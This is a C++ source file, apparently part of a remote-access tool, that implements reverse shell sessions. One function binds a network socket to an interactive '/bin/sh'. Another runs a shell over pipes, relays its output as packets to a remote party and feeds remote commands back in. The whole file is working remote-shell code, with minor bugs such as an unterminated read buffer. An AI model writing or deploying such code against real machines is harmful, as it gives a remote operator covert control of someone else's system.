#include "remote_accsess/ReverseShell.h"
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <cstring>
#include <cstdlib>
#include <string>
#include <iostream>
#include <thread>
#include "protocol/Packet.h"
#include "protocol/PacketData.h"

#define BUFFER_SIZE 1024

void startRSHSession(int sockFD) {
    pid_t pid = fork();
    if (pid == 0) {
        printf("starting rsh session\n");

        printf("before dup2\n");
        dup2(sockFD, 0);
        dup2(sockFD, 1); // STDOUT
        dup2(sockFD, 2); // STDERR*/

        execl("/bin/sh", "sh", "-i", NULL, NULL);

        perror("execl");
    } else {
        int status;
        printf("father wait\n");

        waitpid(pid, &status, 0);
        printf("rsh session ended %d", status);
    }
}

int isDataAvailable(int fd) {
    fd_set readSet;
    struct timeval timeout;

    FD_ZERO(&readSet);
    FD_SET(fd, &readSet);

    timeout.tv_sec = 0;
    timeout.tv_usec = 0;

    return select(fd + 1, &readSet, NULL, NULL, &timeout) > 0;
}

pid_t startRSHSessionPipe(int sockfd, struct sockaddr_in *src, struct sockaddr_in *dst, int *toShellPipe,
                          int *fromShellPipe) {
    if (pipe(toShellPipe) == -1 || pipe(fromShellPipe) == -1) {
        perror("pipe");
        exit(EXIT_FAILURE);
    }

    pid_t child_pid = fork();

    if (child_pid == -1) {
        perror("fork");
        exit(EXIT_FAILURE);
    }

    if (child_pid == 0) {
        close(toShellPipe[1]);
        close(fromShellPipe[0]);

        dup2(toShellPipe[0], STDIN_FILENO);
        dup2(fromShellPipe[1], STDOUT_FILENO);
        dup2(fromShellPipe[1], STDERR_FILENO);

        close(toShellPipe[0]);
        close(fromShellPipe[1]);


        execl("/bin/sh", "sh", "-i", NULL);
        perror("execl");
        exit(EXIT_FAILURE);
    } else {
        close(toShellPipe[0]);
        close(fromShellPipe[1]);
        std::thread thread([sockfd, src, dst, child_pid, fromShellPipe]() {
            char buffer[BUFFER_SIZE];

            while (waitpid(child_pid, NULL, WNOHANG) == 0) {
                size_t byte = read(fromShellPipe[0], buffer, BUFFER_SIZE);
                CommandData commandData((std::string(buffer)));
                Packet packet(RSH_COMMAND, src, dst, commandData);
                sendPacket(sockfd, packet);

            }
            std::cout << "finished reading from shell\n";
        });
        thread.detach();

        return child_pid;
    }
}


void sendRSHCommand(std::string command, int *toShellPipe) {
    if (write((toShellPipe[1]), command.c_str(), command.size()) == -1) {
        perror("write");
    } else {
        std::cout << "write " << command << '\n';
    }

}



